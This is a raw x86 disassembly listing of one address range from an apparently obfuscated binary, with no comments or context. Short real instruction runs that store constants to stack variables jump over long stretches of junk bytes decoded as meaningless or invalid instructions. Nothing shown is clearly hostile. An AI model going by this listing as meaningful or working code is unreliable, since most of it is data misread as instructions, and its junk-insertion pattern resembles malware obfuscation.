  41b645:	lods   al,BYTE PTR ds:[esi]
  41b646:	and    eax,0x27a4e660
  41b64b:	das    
  41b64c:	dec    ebx
  41b64d:	pop    ebp
  41b64e:	enter  0x870d,0x87
  41b652:	lds    eax,FWORD PTR [ebx]
  41b654:	mov    ebp,ebp
  41b656:	push   ds
  41b657:	cmp    al,0x13
  41b659:	push   cs
  41b65a:	add    al,0x8e
  41b65c:	out    dx,eax
  41b65d:	push   cs
  41b65e:	and    ch,cl
  41b660:	adc    BYTE PTR [edx],bh
  41b662:	cmp    eax,0x9e4ef71b
  41b667:	push   esp
  41b668:	xchg   esp,eax
  41b669:	imul   ecx,DWORD PTR [ebx-0x30],0xffffffae
  41b66d:	and    BYTE PTR ds:0xecb456d3,ch
  41b673:	add    esi,DWORD PTR [edx+edx*1+0x30]
  41b677:	arpl   WORD PTR [ebx-0x27],cx
  41b67a:	mov    eax,0x71cff9d5
  41b67f:	fdivr  QWORD PTR [ebx]
  41b681:	neg    DWORD PTR [ebx+0x18]
  41b684:	dec    eax
  41b685:	cld    
  41b686:	std    
  41b687:	ins    BYTE PTR es:[edi],dx
  41b688:	or     al,0xd7
  41b68a:	icebp  
  41b68b:	loop   0x41b60d
  41b68d:	js     0x41b6d0
  41b68f:	or     DWORD PTR ds:0x5bbdde1a,ebp
  41b695:	mov    eax,0x160280dd
  41b69a:	jno    0x41b665
  41b69c:	daa    
  41b69d:	imul   DWORD PTR [eax+eax*2-0x4cd62f92]
  41b6a4:	jmp    0xbf75e26b
  41b6a9:	adc    DWORD PTR [ebp+0x1fe14b16],ecx
  41b6af:	out    dx,al
  41b6b0:	push   ebp
  41b6b1:	mov    esi,DWORD PTR [ebx+0x17]
  41b6b4:	cmp    al,0x55
  41b6b6:	mov    ch,0xf1
  41b6b8:	fimul  WORD PTR [edx+0x5271fef3]
  41b6be:	dec    eax
  41b6bf:	jne    0x41b6bc
  41b6c1:	mov    ebp,0x13e2a274
  41b6c6:	(bad)  
  41b6c7:	pop    esi
  41b6c8:	mov    DWORD PTR [eax],ecx
  41b6ca:	mov    DWORD PTR [eax+0x4],edx
  41b6cd:	pop    ebx
  41b6ce:	leave  
  41b6cf:	ret    0x8
  41b6d2:	push   ebp
  41b6d3:	mov    ebp,esp
  41b6d5:	sub    esp,0x30
  41b6d8:	push   esi
  41b6d9:	jmp    0x41b7a7
  41b6de:	call   0xffdc2242
  41b6e3:	mov    esi,0x68647ff9
  41b6e8:	loope  0x41b6a9
  41b6ea:	jmp    0x5a208b51
  41b6ef:	cmp    eax,0xb10001
  41b6f4:	add    BYTE PTR [eax],al
  41b6f6:	fmul   DWORD PTR [ebp-0x14]
  41b6f9:	mov    ch,0xa9
  41b6fb:	ins    DWORD PTR es:[edi],dx
  41b6fc:	xchg   BYTE PTR [ecx-0x67],dl
  41b6ff:	imul   dl
  41b701:	enter  0x8dee,0x5f
  41b705:	push   0xffffffa4
  41b707:	imul   esp,ecx,0xaf00fbea
  41b70d:	(bad)  
  41b70f:	ret    
  41b710:	ins    BYTE PTR es:[edi],dx
  41b711:	scas   al,BYTE PTR es:[edi]
  41b712:	test   eax,0x1a98b93f
  41b717:	mov    edx,0xd339924c
  41b71c:	push   0xadb42083
  41b721:	sbb    eax,0x2782f4b
  41b726:	cdq    
  41b727:	ror    DWORD PTR [edx+0x6b],1
  41b72a:	xchg   BYTE PTR [edx-0x6422361a],al
  41b730:	fbstp  TBYTE PTR [eax+0x3f]
  41b733:	pop    eax
  41b735:	xlat   BYTE PTR ds:[ebx]
  41b736:	fnstenv [eax-0x7408e49d]
  41b73c:	cmp    dh,BYTE PTR [esp+esi*2+0x78]
  41b740:	addr16 (bad) 
  41b742:	call   0x880d1d0b
  41b747:	sub    eax,DWORD PTR [ebp-0x3b]
  41b74a:	add    DWORD PTR [ecx-0x5a],0xffffffda
  41b74e:	test   DWORD PTR [ebp-0x1f],edi
  41b751:	dec    ebx
  41b752:	sub    esi,ecx
  41b754:	test   al,0x79
  41b757:	mov    dh,0x22
  41b759:	cdq    
  41b75a:	cmp    ch,BYTE PTR [esp+edi*8+0x7c614cff]
  41b761:	aaa    
  41b762:	fld    DWORD PTR [esi-0xd12fa80]
  41b768:	or     BYTE PTR [esi+0x20032e21],bh
  41b76e:	sub    DWORD PTR [edx-0x23bf5e5a],edi
  41b774:	daa    
  41b775:	xor    BYTE PTR [eax-0x61],0xf0
  41b779:	inc    edi
  41b77a:	pop    esi
  41b77b:	jle    0x41b74b
  41b77d:	adc    BYTE PTR [ecx-0x653a8b6a],dh
  41b783:	call   0x7505:0xd38960e9
  41b78a:	ror    ecx,cl
  41b78c:	aad    0x6f
  41b78e:	sar    DWORD PTR [edi],0x91
  41b791:	(bad)  
  41b792:	cmc    
  41b793:	inc    esp
  41b794:	sbb    DWORD PTR [eax+0x4f3b2c9b],ebx
  41b79a:	into   
  41b79b:	scas   eax,DWORD PTR es:[edi]
  41b79c:	fiadd  WORD PTR [eax+0x11]
  41b79f:	add    dl,BYTE PTR [ebp+eiz*1-0x5324b616]
  41b7a6:	inc    ecx
  41b7a7:	mov    DWORD PTR [ebp-0x18],0x9e7
  41b7ae:	mov    DWORD PTR [ebp-0x14],0x886
  41b7b5:	jmp    0x41b883
  41b7ba:	inc    edi
  41b7bb:	pop    ebp
  41b7bc:	(bad)  
  41b7bd:	cmp    al,0xfe
  41b7bf:	mov    edi,0xe2567fc7
  41b7c4:	retf   0x2cbb
  41b7c7:	hlt    
  41b7c8:	ins    DWORD PTR es:[edi],dx
  41b7c9:	fimul  WORD PTR [edx]
  41b7cb:	add    DWORD PTR ds:[eax],eax
  41b7ce:	mov    cl,0x0
  41b7d0:	add    BYTE PTR [eax],al
  41b7d2:	push   esi
  41b7d3:	jae    0x41b771
  41b7d5:	xchg   ebp,eax
  41b7d6:	mov    DWORD PTR [eax-0x5b],0x470bc806
  41b7dd:	in     eax,0x96
  41b7df:	sub    BYTE PTR [ecx+0x6],cl
  41b7e2:	dec    edi
  41b7e3:	mov    eax,ds:0x7eef7353
  41b7e8:	je     0x41b7f4
  41b7ea:	jb     0x41b7da
  41b7ec:	pusha  
  41b7ed:	cmc    
  41b7ee:	ret    
  41b7ef:	stos   BYTE PTR es:[edi],al
  41b7f0:	iret   
  41b7f1:	fwait
  41b7f2:	xor    eax,0xb7b416ab
  41b7f7:	fsubr  QWORD PTR [edi]
  41b7f9:	mov    eax,0x1793c1cf
  41b7fe:	adc    edi,0x6b170117
  41b804:	inc    esi
  41b805:	jbe    0x41b7be
  41b807:	shr    DWORD PTR [ebx-0x5b33b936],cl
  41b80d:	inc    ebx
  41b80e:	lods   al,BYTE PTR ds:[esi]
  41b80f:	sub    eax,0x85610859
  41b814:	iret   
  41b815:	test   eax,0x7ebe9e54
  41b81a:	fisttp WORD PTR [esi]
  41b81c:	out    dx,al
  41b81d:	imul   ebx,DWORD PTR [eax],0x4161be2d
  41b823:	mov    edi,DWORD PTR [ebx]
  41b825:	xor    edx,esi
  41b827:	push   ebx
  41b828:	jno    0x41b7fc
  41b82a:	sub    bh,cl
  41b82c:	(bad)  
  41b82d:	xchg   edx,eax
  41b82e:	out    dx,al
  41b82f:	movzx  ebp,BYTE PTR [ebp-0x36]
  41b833:	fist   WORD PTR [ebx]
  41b835:	mov    esp,?
  41b837:	jp     0x41b86f
  41b839:	(bad)  
  41b83b:	pushf  
  41b83c:	jns    0x41b7da
  41b83e:	or     eax,0x5ae84cc9
  41b843:	inc    ecx
  41b844:	add    bl,BYTE PTR [ecx+0x44]
  41b847:	test   BYTE PTR [edx+0x37],dh
  41b84a:	adc    ecx,edx
  41b84c:	fisubr WORD PTR [edi+0x55536077]
  41b852:	out    dx,al
  41b853:	add    DWORD PTR [ecx+edx*2],eax
  41b856:	push   cs
  41b857:	ja     0x41b843
  41b859:	and    eax,DWORD PTR [ebx]
  41b85b:	xchg   edi,edx
  41b85d:	jnp    0x41b879
  41b85f:	scas   al,BYTE PTR es:[edi]
  41b860:	lods   eax,DWORD PTR ds:[esi]
  41b861:	js     0x41b859
  41b863:	mov    es,WORD PTR [ebx-0x65]
  41b866:	xchg   ch,ah
  41b868:	and    eax,edx
  41b86a:	(bad)  
  41b86b:	cmp    BYTE PTR [ecx+0x5b84cfd5],0x69
  41b872:	(bad)  
  41b873:	loopne 0x41b80d
  41b875:	inc    edi
  41b876:	pop    ebx
  41b877:	es xchg esi,eax
  41b879:	loopne 0x41b8f2
  41b87b:	je     0x41b876
  41b87d:	push   cs
  41b87e:	cmc    
  41b87f:	fs test cl,0x30
  41b883:	mov    DWORD PTR [ebp-0x10],0x24af
  41b88a:	jmp    0x41b958
  41b88f:	push   edx
  41b890:	push   edx
  41b891:	gs gs gs ja 0x41b8e8
  41b896:	ja     0x41b833
  41b898:	jo     0x41b8a5
  41b89a:	fimul  DWORD PTR gs:[ebx]
  41b89d:	jo     0x41b86c
  41b89f:	mov    ebx,0xb100013e
  41b8a4:	add    BYTE PTR [eax],al
  41b8a6:	add    BYTE PTR [eax+0x7607c035],ch
  41b8ac:	leave  
  41b8ad:	push   edi
  41b8ae:	sahf   
  41b8af:	mov    ecx,es
  41b8b1:	stos   DWORD PTR es:[edi],eax
  41b8b2:	test   BYTE PTR [ebp-0x42],0xe6
  41b8b6:	or     eax,0x7edb2c67
  41b8bb:	stos   BYTE PTR es:[edi],al
  41b8bc:	sub    DWORD PTR [esi],esi
  41b8be:	(bad)  
  41b8bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8c0:	hlt    
  41b8c1:	xchg   edi,eax
  41b8c2:	xchg   esi,eax
  41b8c3:	dec    edi
  41b8c4:	clc    
  41b8c5:	call   0xc066:0x46c5b9ce
  41b8cc:	inc    ecx
  41b8cd:	xor    al,0x49
  41b8cf:	ins    DWORD PTR es:[edi],dx
  41b8d0:	xor    bh,BYTE PTR [edx+0x2d7105db]
  41b8d6:	pop    edi
  41b8d7:	xchg   esi,eax
  41b8d8:	hlt    
  41b8d9:	sub    eax,DWORD PTR [ecx-0x14]
  41b8dc:	pop    edx
  41b8dd:	mov    edx,0x8c76cc21
  41b8e2:	cmp    al,0x88
  41b8e4:	nop
  41b8e5:	push   esp
  41b8e6:	mov    eax,0x8e98fdcf
  41b8eb:	in     al,dx
  41b8ec:	std    
  41b8ed:	inc    edi
  41b8ee:	addr16 int 0x66
  41b8f1:	not    BYTE PTR [edi]
  41b8f3:	sub    eax,0x1b1f248f
  41b8f8:	stos   DWORD PTR es:[edi],eax
  41b8f9:	mov    ecx,?
  41b8fb:	cmp    al,0x6f
  41b8fd:	inc    ebp
  41b8fe:	push   cs
  41b8ff:	mov    dh,0x25
  41b901:	mov    al,ds:0xfef46c8a
  41b906:	stos   BYTE PTR es:[edi],al
  41b907:	lods   eax,DWORD PTR ds:[esi]
  41b908:	icebp  
  41b909:	test   eax,0xc10c7a15
  41b90e:	imul   edi,ebx,0x7fa61c43
  41b914:	push   esp
  41b915:	cdq    
  41b916:	ret    0xcfcb
  41b919:	ds mov ah,0xee
  41b91c:	dec    esp
  41b91d:	inc    edi
  41b91e:	add    dl,BYTE PTR [edx]
  41b920:	xor    ecx,DWORD PTR [ebp-0x72a904b5]
  41b926:	or     ebx,DWORD PTR [ebx-0x2cc652e4]
  41b92c:	int    0x7c
  41b92e:	add    eax,0xd372a905
  41b933:	mov    edx,0x4525bc29
  41b938:	iret   
  41b939:	pop    esp
  41b93a:	daa    
  41b93b:	in     al,dx
  41b93c:	jecxz  0x41b916
  41b93e:	in     al,0x63
  41b940:	push   0xffffff90
  41b942:	pusha  
  41b943:	add    cl,BYTE PTR [ecx]
  41b945:	inc    edi
  41b946:	mov    dh,0x65
  41b948:	ja     0x41b8e0
  41b94a:	cs sti 
  41b94c:	push   eax
  41b94d:	retf   0x853b
  41b950:	pop    esi
  41b951:	icebp  
  41b952:	xchg   edx,eax
  41b953:	mov    dl,0x86
  41b955:	jmp    0x46098778
  41b95a:	loopne 0x41b9c6
  41b95c:	iret   
  41b95d:	or     DWORD PTR [eax],eax
  41b95f:	jmp    0x41ba2d
  41b964:	aas    
  41b965:	mov    ebp,esi
  41b967:	stos   DWORD PTR es:[edi],eax
  41b968:	(bad)  
  41b969:	out    dx,eax
  41b96a:	jg     0x41b90b
  41b96c:	inc    esp
  41b96d:	into   
  41b96e:	push   0xd01a10a4
  41b973:	in     al,0x6c
  41b975:	aas    
  41b976:	add    DWORD PTR [eax],eax
  41b978:	mov    cl,0x0
  41b97a:	add    BYTE PTR [eax],al
  41b97c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b97d:	test   bh,ah
  41b97f:	hlt    
  41b980:	shr    DWORD PTR [ebp-0x34],0xa0
  41b984:	in     eax,0xea
  41b986:	or     eax,0x82414afe
  41b98b:	scas   al,BYTE PTR es:[edi]
  41b98c:	push   eax
  41b98d:	stc    
  41b98e:	sbb    dh,BYTE PTR [edx]
  41b990:	out    dx,eax
  41b991:	mov    eax,ds:0x5e4a493c
  41b996:	cmp    eax,0x5fae194c
  41b99b:	pop    ebx
  41b99c:	inc    esp
  41b99d:	lsl    ebx,WORD PTR [ecx+0x46a0d2fb]
  41b9a4:	mov    dl,BYTE PTR [ebx]
  41b9a6:	es xchg ebp,eax
  41b9a8:	mov    cl,0x44
  41b9aa:	mov    ah,ah
  41b9ac:	mov    cl,dh
  41b9ae:	xchg   ebx,eax
  41b9af:	test   eax,0x45b5270d
  41b9b4:	out    dx,al
  41b9b5:	jae    0x41b990
  41b9b7:	jns    0x41b9d7
  41b9b9:	cmp    al,0xf9
  41b9bb:	stos   DWORD PTR es:[edi],eax
  41b9bc:	jg     0x41b9ac
  41b9be:	xor    bl,BYTE PTR [ecx+0x3e87f2c]
  41b9c4:	or     BYTE PTR [esi+0x369a312b],dh
  41b9ca:	dec    eax
  41b9cb:	int3   
  41b9cc:	lods   eax,DWORD PTR ds:[esi]
  41b9cd:	xor    dl,bh
  41b9cf:	lods   eax,DWORD PTR ds:[esi]
  41b9d0:	sahf   
  41b9d1:	leave  
  41b9d2:	xor    ecx,edx
  41b9d4:	and    eax,0x3f7e7c16
  41b9d9:	sub    BYTE PTR [ebx-0x3f],bl
  41b9dc:	pop    ss
  41b9dd:	fadd   QWORD PTR [esi+0xa]
  41b9e0:	out    0x5,eax
  41b9e2:	cmp    al,0xeb
  41b9e4:	mov    eax,0xca55ff8e
  41b9e9:	or     BYTE PTR [esi+0x3f],bh
  41b9ec:	lahf   
  41b9ed:	xchg   BYTE PTR [esi],ah
  41b9ef:	pop    ecx
  41b9f0:	cmc    
  41b9f1:	in     eax,dx
  41b9f2:	hlt    
  41b9f3:	cmp    ecx,DWORD PTR [esi-0x2c]
  41b9f6:	xchg   ecx,eax
  41b9f7:	ja     0x41b9c3
  41b9f9:	mov    edx,0xab4eb77c
  41b9fe:	imul   ecx,edi,0x24
  41ba01:	or     DWORD PTR [ecx+0x2027237],ebx
  41ba07:	les    edx,FWORD PTR [edx+ebp*2+0x6d7c4652]
  41ba0e:	repnz test al,0xef
  41ba11:	dec    esi
  41ba12:	pop    ss
  41ba13:	les    edi,FWORD PTR [esi+0x36620ca5]
  41ba19:	inc    eax
  41ba1a:	test   BYTE PTR [eax+0x12],bl
  41ba1d:	lahf   
  41ba1e:	fisub  DWORD PTR [ebp+eiz*1-0x52]
  41ba22:	cmp    dl,BYTE PTR [ecx]
  41ba24:	mov    ecx,0x2eed6a3c
  41ba29:	and    ecx,DWORD PTR [eax-0x1e]
  41ba2c:	mov    WORD PTR [ebp-0x1c],0x4ebe
  41ba32:	add    BYTE PTR [eax],al
  41ba34:	mov    DWORD PTR [ebp-0xc],0x34fa
  41ba3b:	mov    DWORD PTR [ebp-0x8],0x3830
  41ba42:	mov    DWORD PTR [ebp-0x4],0x295f
  41ba49:	jmp    0x41bb17
  41ba4e:	inc    edi
  41ba4f:	call   0x7e00e005
  41ba54:	xlat   BYTE PTR ds:[ebx]
  41ba55:	jmp    0x11b4:0xc3661a77
  41ba5c:	push   ss
  41ba5d:	mov    ebx,0x1401d
  41ba62:	mov    cl,0x0
  41ba64:	add    BYTE PTR [eax],al
  41ba66:	push   ecx
  41ba67:	aam    0xc0
  41ba69:	push   esi
  41ba6a:	push   esi
  41ba6b:	jb     0x41ba04
  41ba6d:	inc    edx
  41ba6e:	jbe    0x41ba3f
  41ba70:	inc    ecx
  41ba71:	push   es
  41ba72:	xor    al,0x66
  41ba74:	mov    ds:0x4f1d8b6c,al
  41ba79:	sbb    eax,0xe2adc3e9
  41ba7e:	test   DWORD PTR [edi],esi
  41ba80:	pop    eax
  41ba81:	pop    eax
  41ba82:	das    
  41ba83:	stos   BYTE PTR es:[edi],al
  41ba84:	fucomip st,st(0)
  41ba86:	jg     0x41ba9e
  41ba88:	and    BYTE PTR [esi+0x6d1e60d0],dl
  41ba8e:	jbe    0x41bae4
  41ba90:	mov    ah,0x40
  41ba92:	lock sub BYTE PTR [esp+ebp*2-0x71db5212],0xb6
  41ba9b:	hlt    
  41ba9c:	and    DWORD PTR [edi+0x4c],0x4a
  41baa0:	(bad)  
  41baa1:	aam    0x81
  41baa3:	or     DWORD PTR [ebp+0x3f002523],esi
  41baa9:	out    dx,eax
  41baaa:	pop    es
  41baab:	xor    al,0xa4
  41baad:	xor    al,0x5f
  41baaf:	sbb    ebp,DWORD PTR [edi-0x20]
  41bab2:	fsubr  DWORD PTR [ebx+0x70b3b1b0]
  41bab8:	jg     0x41ba53
  41baba:	push   edx
  41babb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41babc:	cli    
  41babd:	loope  0x41baa3
  41babf:	out    dx,eax
  41bac0:	aaa    
  41bac1:	in     eax,dx
  41bac2:	fisubr DWORD PTR [ebx-0x78]
  41bac5:	lods   eax,DWORD PTR ds:[esi]
  41bac6:	xchg   DWORD PTR [eax+eax*1-0xa],esi
  41baca:	push   ss
  41bacb:	xchg   DWORD PTR [edi+ebx*1+0x39],ebx
  41bacf:	neg    DWORD PTR [ecx-0x3f089863]
  41bad5:	repnz leave 
  41bad7:	dec    ebp
  41bad8:	mov    edx,DWORD PTR [esi+0x7f]
  41badb:	xchg   DWORD PTR [edx],edi
  41badd:	xchg   edx,ebp
  41badf:	or     dl,BYTE PTR [edx+0x7e]
  41bae2:	loop   0x41baf2
  41bae4:	jle    0x41baac
  41bae6:	ins    BYTE PTR es:[edi],dx
  41bae7:	pushf  
  41bae8:	cmp    BYTE PTR [esp+esi*2+0x51534ec],0xfa
  41baf0:	hlt    
  41baf1:	imul   edx,DWORD PTR [edx+ebx*2],0x6c17e09
  41baf8:	xchg   edi,eax
  41baf9:	xchg   ax,ax
  41bafb:	imul   DWORD PTR [eax]
  41bafd:	out    0xe6,eax
  41baff:	test   al,0xb3
  41bb01:	xchg   edi,eax
  41bb02:	mov    ds:0xb84c8ce1,eax
  41bb07:	hlt    
  41bb08:	or     WORD PTR cs:[esi+edx*2+0x4f],sp
  41bb0e:	adc    BYTE PTR es:[ebx-0x7a0ffd5f],dl
  41bb15:	mov    dh,0x8d
  41bb17:	mov    DWORD PTR [ebp-0x24],0x659
  41bb1e:	mov    DWORD PTR [ebp-0x30],0x16c1
  41bb25:	jmp    0x41bbf3
  41bb2a:	fs cmp eax,0xd7ff97ef
  41bb30:	jl     0x41bb31
  41bb32:	push   ds
  41bb33:	push   0xffffffb8
  41bb35:	mov    eax,ds:0xa452ce06
  41bb3a:	into   
  41bb3b:	inc    eax
  41bb3c:	add    DWORD PTR [eax],eax
  41bb3e:	mov    cl,0x0
  41bb40:	add    BYTE PTR [eax],al
  41bb42:	out    0x5c,al
  41bb44:	inc    ebx
  41bb45:	inc    ebx
  41bb46:	aaa    
  41bb47:	xchg   esi,eax
  41bb48:	loopne 0x41bb87
  41bb4a:	test   al,0x19
  41bb4c:	and    eax,0x477eb485
  41bb51:	mov    ebp,0xdafb91e4
  41bb56:	adc    bl,cl
  41bb58:	aas    
  41bb59:	pop    edx
  41bb5a:	sbb    BYTE PTR [ebx-0x2c],0xa2
  41bb5e:	popf   
  41bb5f:	adc    al,0x39
  41bb61:	or     eax,0xc514594e
  41bb66:	xchg   ebp,edi
  41bb68:	pop    edx
  41bb69:	dec    edx
  41bb6a:	mov    DWORD PTR [ebx-0x7c],esi
  41bb6d:	push   edi
  41bb6e:	aaa    
  41bb6f:	icebp  
  41bb70:	jg     0x41bb43
  41bb72:	sbb    eax,0xc85a4b4
  41bb77:	ret    0x9008
  41bb7a:	pusha  
  41bb7b:	inc    ebp
  41bb7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb7d:	push   esi
  41bb7e:	in     al,dx
  41bb7f:	jne    0x41bb70
  41bb81:	aad    0xb9
  41bb83:	dec    ecx
  41bb84:	inc    ebx
  41bb85:	sbb    al,0xcb
  41bb87:	push   ebx
  41bb88:	out    dx,eax
  41bb89:	or     ebp,esp
  41bb8b:	jns    0x41bbc7
  41bb8d:	jp     0x41bb56
  41bb8f:	inc    esp
  41bb90:	call   0xbe25b187
  41bb95:	aas    
  41bb96:	idiv   BYTE PTR [edi-0x3321dde4]
  41bb9c:	lds    eax,FWORD PTR [ecx+0x6fa08328]
  41bba2:	mov    edi,DWORD PTR [ecx]
  41bba4:	xor    ah,BYTE PTR [ecx]
  41bba6:	add    cl,BYTE PTR ds:0xc878558
  41bbac:	pop    ebp
  41bbad:	sti    
  41bbae:	repnz cmp BYTE PTR [eax],0xfe
  41bbb2:	jae    0x41bc09
  41bbb4:	int    0xf
  41bbb6:	in     eax,0x5f
  41bbb8:	int3   
  41bbb9:	fs push ebx
  41bbbb:	mov    ebx,0xd72bb8a1
  41bbc0:	mov    esi,0x459ee30f
  41bbc5:	and    bl,BYTE PTR [esi+0x62fb9bbd]
  41bbcb:	lock out 0xef,al
  41bbce:	cdq    
  41bbcf:	inc    edx
  41bbd0:	lods   al,BYTE PTR ds:[esi]
  41bbd1:	sub    al,0x1a
  41bbd3:	xlat   BYTE PTR ds:[ebx]
  41bbd4:	sbb    eax,0xf83c858c
  41bbd9:	into   
  41bbda:	mov    ds:0x2621eca8,al
  41bbdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbe0:	and    DWORD PTR [ebx+0x31b9d929],ebx
  41bbe6:	test   al,0x9b
  41bbe8:	sub    DWORD PTR ds:0x3e4f38ae,edx
  41bbee:	shr    DWORD PTR ds:0xc7655f33,0x45
  41bbf5:	aam    0x7a
  41bbf7:	jg     0x41bbf9
  41bbf9:	add    bh,al
  41bbfb:	inc    ebp
  41bbfc:	fcomp  DWORD PTR [edx+edi*1]
  41bbff:	add    BYTE PTR [eax],al
  41bc01:	mov    eax,DWORD PTR [ebp-0x10]
  41bc04:	mov    ecx,DWORD PTR [ebp-0x14]
  41bc07:	imul   eax,eax,0x1cd3
  41bc0d:	sub    eax,ecx
  41bc0f:	mov    ecx,DWORD PTR [ebp-0x18]
  41bc12:	jmp    0x41bce0
  41bc17:	xor    DWORD PTR [ecx-0x300ef09f],esp
  41bc1d:	jg     0x41bbde
  41bc1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc20:	and    DWORD PTR [ecx+0x7c0dd57a],edi
  41bc26:	lahf   
  41bc27:	jg     0x41bc6a
  41bc29:	add    DWORD PTR [eax],eax
  41bc2b:	mov    cl,0x0
  41bc2d:	add    BYTE PTR [eax],al
  41bc2f:	push   edx
  41bc30:	xor    eax,0xf3a12807
  41bc35:	pop    ebx
  41bc36:	ret    0xf47b
  41bc39:	sti    
  41bc3a:	enter  0x1e5e,0x7e
  41bc3e:	push   ebp
  41bc3f:	cmp    BYTE PTR [esi],bh
  41bc41:	stos   DWORD PTR es:[edi],eax
  41bc42:	mov    bh,0xc8
  41bc44:	clc    
  41bc45:	mov    eax,0x900fde68
  41bc4a:	inc    edi
  41bc4b:	into   
  41bc4c:	aad    0x92
  41bc4e:	test   eax,0xea5742c0
  41bc53:	push   ebx
  41bc54:	mov    ebp,0x3fa53428
  41bc59:	mov    ch,0xd3
  41bc5b:	enter  0x6caf,0xf
  41bc5f:	mov    ah,0x81
  41bc61:	pop    edx
  41bc62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc63:	mov    bl,0x76
  41bc65:	xor    al,0xd1
  41bc67:	je     0x41bc05
  41bc69:	leave  
  41bc6a:	add    al,0x61
  41bc6c:	out    0xd7,eax
  41bc6e:	out    dx,al
  41bc6f:	inc    edi
  41bc70:	(bad)  
  41bc71:	mov    ds:0x41391268,al
  41bc76:	popf   
  41bc77:	xor    ah,BYTE PTR [ecx+0x5677d8fb]
  41bc7d:	sbb    eax,0xf95791c3
  41bc82:	sub    cl,BYTE PTR [ebx-0x10e72963]
  41bc88:	lods   al,BYTE PTR ds:[esi]
  41bc89:	push   esi
  41bc8a:	add    BYTE PTR [edx+0x28],cl
  41bc8d:	and    ebx,DWORD PTR [ebp+0x22]
  41bc90:	cmp    ch,BYTE PTR [edx]
  41bc92:	xor    dl,BYTE PTR [ebx]
  41bc94:	mov    eax,0xc2d2554
  41bc99:	cmp    ebx,DWORD PTR [edi+ebx*8]
  41bc9c:	(bad)  
  41bc9d:	mov    edx,0xba043f84
  41bca2:	ret    0x357a
  41bca5:	or     BYTE PTR [ecx+0xf],0xca
  41bca9:	fist   DWORD PTR [eax+esi*1-0x15]
  41bcad:	test   eax,0xe58e0deb
  41bcb2:	jmp    0x41bcbf
  41bcb4:	cmp    DWORD PTR [edx+0x4326c3b8],ebx
  41bcba:	daa    
  41bcbb:	mov    al,ds:0xa7fb2d30
  41bcc0:	lds    esp,FWORD PTR [eax+0x11ae8490]
  41bcc6:	dec    esp
  41bcc7:	jb     0x41bccb
  41bcc9:	xchg   ecx,eax
  41bcca:	xchg   edx,eax
  41bccb:	int3   
  41bccc:	and    ah,ah
  41bcce:	xchg   ebx,eax
  41bccf:	mov    BYTE PTR [esi+0x45c79b8c],ah
  41bcd5:	mov    cl,0xe0
  41bcd7:	jle    0x41bcfc
  41bcd9:	std    
  41bcda:	dec    edx
  41bcdb:	push   esi
  41bcdc:	adc    edx,DWORD PTR ds:0xea0d92d6
  41bce2:	or     al,0x0
  41bce4:	add    BYTE PTR [ebp-0x69e5f774],cl
  41bcea:	fdivp  st(3),st
  41bcec:	mov    eax,DWORD PTR [ebp-0x1c]
  41bcef:	mov    esi,DWORD PTR [ebp-0x20]
  41bcf2:	jmp    0x41bdc0
  41bcf7:	mov    ds:0x7b4f4bd0,eax
  41bcfc:	fbld   TBYTE PTR [edi+0x389236fc]
  41bd02:	imul   ecx,DWORD PTR [esi+0x5d],0x42306577
  41bd09:	add    DWORD PTR [eax],eax
  41bd0b:	mov    cl,0x0
  41bd0d:	add    BYTE PTR [eax],al
  41bd0f:	test   DWORD PTR [edx+0x7cf95db8],ebx
  41bd15:	fimul  WORD PTR [esi+0x6c7ec315]
  41bd1b:	cdq    
  41bd1c:	aad    0x8
  41bd1e:	adc    BYTE PTR [ecx+0x79],cl
  41bd21:	rol    DWORD PTR [ecx-0x76ed973b],1
  41bd27:	mov    BYTE PTR cs:[ecx+0x53],ch
  41bd2b:	and    esp,DWORD PTR [edx+0x140d31c8]
  41bd31:	and    bh,BYTE PTR fs:[edx+0x5b]
  41bd35:	xor    DWORD PTR [edx],eax
  41bd37:	ret    
  41bd38:	sub    dh,BYTE PTR [eax-0x6c]
  41bd3b:	mov    esi,0x9bb0ea87
  41bd40:	cmc    
  41bd41:	and    eax,ebx
  41bd43:	fild   QWORD PTR [eax*4-0x4d1f4a89]
  41bd4a:	bound  esp,QWORD PTR [ecx+0x5d3f4881]
  41bd50:	hlt    
  41bd51:	push   es
  41bd52:	enter  0xf8c9,0x50
  41bd56:	jecxz  0x41bd0a
  41bd58:	aas    
  41bd59:	dec    esi
  41bd5a:	sbb    al,BYTE PTR [ecx+0x3d]
  41bd5d:	aad    0x25
  41bd5f:	lahf   
  41bd60:	inc    edi
  41bd61:	jnp    0x41bd2f
  41bd63:	pop    esi
  41bd64:	ret    0x9c49
  41bd67:	std    
  41bd68:	cmp    bh,BYTE PTR [edi-0x72f0b44f]
  41bd6e:	dec    ebp
  41bd6f:	enterw 0x77e0,0xaf
  41bd74:	cmp    al,0xda
  41bd76:	jno    0x41bd82
  41bd78:	ja     0x41bd47
  41bd7a:	hlt    
  41bd7b:	jno    0x41bd95
  41bd7d:	inc    ebp
  41bd7e:	or     al,0x4e
  41bd80:	xchg   edx,eax
  41bd81:	push   es
  41bd82:	retf   
  41bd83:	js     0x41bdb3
  41bd85:	mov    ?,WORD PTR [edx+0xe]
  41bd88:	lahf   
  41bd89:	add    ecx,ecx
  41bd8b:	sahf   
  41bd8c:	dec    eax
  41bd8d:	aad    0x89
  41bd8f:	or     BYTE PTR [esp+eax*2+0x25],dl
  41bd93:	test   BYTE PTR [ecx-0x368824ad],ch
  41bd99:	enter  0x4023,0x85
  41bd9d:	mov    ebp,0xc23055d
  41bda2:	xlat   BYTE PTR ds:[ebx]
  41bda3:	or     al,0x62
  41bda5:	pop    ebx
  41bda6:	mov    ah,0x3a
  41bda8:	mov    ah,0xe1
  41bdaa:	sbb    al,0x7c
  41bdac:	sub    bh,BYTE PTR [ebp+0x55b4644c]
  41bdb2:	dec    esp
  41bdb3:	inc    eax
  41bdb4:	mov    ah,0x0
  41bdb6:	pop    eax
  41bdb7:	cs xchg edi,eax
  41bdb9:	and    DWORD PTR ds:0x271ff3b,edi
  41bdbf:	fisubr WORD PTR [ecx-0x40]
  41bdc2:	sti    
  41bdc3:	push   eax
  41bdc4:	add    BYTE PTR [eax],al
  41bdc6:	xor    eax,0x378d
  41bdcb:	xor    edx,edx
  41bdcd:	div    esi
